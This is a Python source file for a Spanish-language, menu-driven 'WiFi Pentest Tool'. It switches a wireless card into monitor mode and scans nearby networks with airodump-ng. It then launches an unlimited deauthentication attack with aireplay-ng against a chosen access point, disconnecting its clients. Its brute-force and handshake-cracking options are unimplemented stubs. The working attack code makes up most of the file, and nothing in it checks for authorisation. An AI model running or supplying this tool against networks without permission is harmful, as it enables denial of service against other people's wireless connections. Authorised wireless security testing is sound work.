import subprocess
import os
import csv
import time
from termcolor import colored
from pyfiglet import figlet_format

def banner():
    os.system('clear')
    print(colored(figlet_format('WiFi Pentest Tool'), 'red'))
    print(colored('Desarrollada por Thomas O\'Neil Álvarez', 'green'))
    print(colored('======================================', 'yellow'))

def menu():
    print(colored('[1] Escanear redes WiFi', 'blue'))
    print(colored('[2] Realizar ataque de fuerza bruta', 'blue'))
    print(colored('[3] Ataque de desautenticación', 'blue'))
    print(colored('[4] Capturar Handshake', 'blue'))
    print(colored('[5] Cracking de Handshake', 'blue'))
    print(colored('[6] Guardar resultados del escaneo', 'blue'))
    print(colored('[7] Cargar configuración', 'blue'))
    print(colored('[8] Salir', 'blue'))

def set_interface_monitor_mode(iface):
    try:
        subprocess.run(['sudo', 'ifconfig', iface, 'down'], check=True)
        subprocess.run(['sudo', 'iwconfig', iface, 'mode', 'monitor'], check=True)
        subprocess.run(['sudo', 'ifconfig', iface, 'up'], check=True)
        print(colored(f'Interfaz {iface} configurada en modo monitor.', 'green'))
    except subprocess.CalledProcessError:
        print(colored(f'ERROR: No se pudo poner {iface} en modo monitor.', 'red'))

def is_interface_available(iface):
    try:
        output = subprocess.check_output(['ip', 'link', 'show', iface], stderr=subprocess.STDOUT)
        return iface in output.decode()
    except subprocess.CalledProcessError:
        return False

def is_interface_in_monitor_mode(iface):
    try:
        output = subprocess.check_output(['iwconfig', iface], stderr=subprocess.STDOUT)
        return 'Mode:Monitor' in output.decode()
    except subprocess.CalledProcessError:
        return False

def scan_wifi():
    iface = input(colored('Introduce la interfaz de red (por ejemplo, wlan0): ', 'yellow')).strip()

    if not is_interface_available(iface):
        print(colored(f'ERROR: La interfaz {iface} no existe.', 'red'))
        return [], [], []

    if not is_interface_in_monitor_mode(iface):
        set_interface_monitor_mode(iface)

    csv_file = '/tmp/airodump'
    networks = []
    bssids = []
    channels = []

    try:
        print(colored('Iniciando escaneo... Presiona Ctrl+C para finalizar el escaneo y proceder con el ataque.', 'green'))
        cmd = ['sudo', 'airodump-ng', iface, '--write', csv_file, '--write-interval', '1', '--output-format', 'csv']
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        try:
            while True:
                time.sleep(1)
                csv_path = f'{csv_file}-01.csv'
                if os.path.exists(csv_path):
                    with open(csv_path, 'r') as f:
                        reader = csv.reader(f)
                        networks = []
                        bssids = []
                        channels = []
                        for row in reader:
                            if len(row) > 13 and row[13].strip() and row[0].strip():
                                bssid = row[0].strip()
                                essid = row[13].strip()
                                channel = row[3].strip()
                                if essid not in networks:
                                    networks.append(essid)
                                    bssids.append(bssid)
                                    channels.append(channel)
                        if networks:
                            print(colored('Redes WiFi encontradas:', 'green'))
                            for idx, (network, channel) in enumerate(zip(networks, channels), start=1):
                                print(colored(f'[{idx}] {network} (Canal: {channel})', 'red'))
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())  # Mostrar salida en tiempo real
        except KeyboardInterrupt:
            print(colored('Escaneo detenido por el usuario.', 'yellow'))
        finally:
            process.terminate()
            process.wait()

        return networks, bssids, channels
    except subprocess.CalledProcessError as e:
        print(colored(f'ERROR: No se pudo ejecutar el escaneo. {e}', 'red'))
    except Exception as e:
        print(colored(f'ERROR: Se produjo un error inesperado. {e}', 'red'))

    return [], [], []

def deauth_attack(networks, bssids, channels):
    try:
        choice = int(input(colored('Selecciona el número de la red objetivo: ', 'yellow')).strip())
        if choice < 1 or choice > len(networks):
            raise ValueError('Número de red no válido.')
        essid = networks[choice - 1]
        bssid = bssids[choice - 1]
        channel = channels[choice - 1]
        print(colored(f'Seleccionaste: {essid}', 'green'))
    except (ValueError, IndexError) as e:
        print(colored(f'ERROR: {e}', 'red'))
        return

    iface = input(colored('Introduce la interfaz de red (por ejemplo, wlan0mon): ', 'yellow')).strip()

    if not is_interface_available(iface):
        print(colored(f'ERROR: La interfaz {iface} no existe.', 'red'))
        return

    if not is_interface_in_monitor_mode(iface):
        set_interface_monitor_mode(iface)

    try:
        # Configurar el canal de la interfaz
        subprocess.run(['sudo', 'iwconfig', iface, 'channel', channel], check=True)
        print(colored(f'Interfaz {iface} configurada en el canal {channel}.', 'green'))
    except subprocess.CalledProcessError as e:
        print(colored(f'ERROR: No se pudo configurar el canal. {e}', 'red'))
        return

    print(colored('Iniciando ataque de desautenticación...', 'green'))
    try:
        cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, iface]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
        except KeyboardInterrupt:
            print(colored('Ataque detenido por el usuario.', 'yellow'))
            process.terminate()
        finally:
            err = process.stderr.read()
            if err:
                print(colored(f'ERROR: {err}', 'red'))
    except Exception as e:
        print(colored(f'ERROR: No se pudo ejecutar el ataque de desautenticación. {e}', 'red'))

def main():
    banner()
    networks = []
    bssids = []
    channels = []
    while True:
        menu()
        choice = input(colored('Selecciona un ataque: ', 'yellow')).strip()
        if choice == '1':
            networks, bssids, channels = scan_wifi()
        elif choice == '2':
            # Implementar función para ataque de fuerza bruta
            pass
        elif choice == '3':
            if networks:
                deauth_attack(networks, bssids, channels)
            else:
                print(colored('ERROR: Primero escanea las redes WiFi.', 'red'))
        elif choice == '4':
            # Implementar función para capturar handshake
            pass
        elif choice == '5':
            # Implementar función para cracking de handshake
            pass
        elif choice == '6':
            # Implementar función para guardar resultados del escaneo
            pass
        elif choice == '7':
            # Implementar función para cargar configuración
            pass
        elif choice == '8':
            print(colored('Saliendo...', 'red'))
            break
        else:
            print(colored('Opción no válida', 'red'))

if __name__ == '__main__':
    main()
